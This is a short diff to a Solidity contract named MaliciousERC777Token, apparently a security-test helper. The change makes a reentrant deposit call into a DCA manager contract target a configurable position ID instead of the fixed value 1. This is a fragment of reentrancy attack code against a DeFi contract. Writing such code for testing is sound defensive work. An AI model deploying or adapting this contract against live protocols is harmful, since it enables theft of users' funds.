@@ -217,6 +217,7 @@ contract MaliciousERC777Token is IERC20 {
 
     address public attacker;
     address public dcaManager;
+    uint256 public targetPositionId;
     bool public shouldAttack;
 
     constructor() {
@@ -224,9 +225,14 @@ contract MaliciousERC777Token is IERC20 {
         _balances[msg.sender] = _totalSupply;
     }
 
-    function setAttackParams(address _attacker, address _dcaManager) external {
+    function setAttackParams(
+        address _attacker,
+        address _dcaManager,
+        uint256 _positionId
+    ) external {
         attacker = _attacker;
         dcaManager = _dcaManager;
+        targetPositionId = _positionId;
         shouldAttack = true;
     }
 
@@ -267,7 +273,7 @@ contract MaliciousERC777Token is IERC20 {
             (bool success, ) = dcaManager.call(
                 abi.encodeWithSignature(
                     "deposit(uint256,address,uint256)",
-                    1,
+                    targetPositionId,
                     address(this),
                     1
                 )
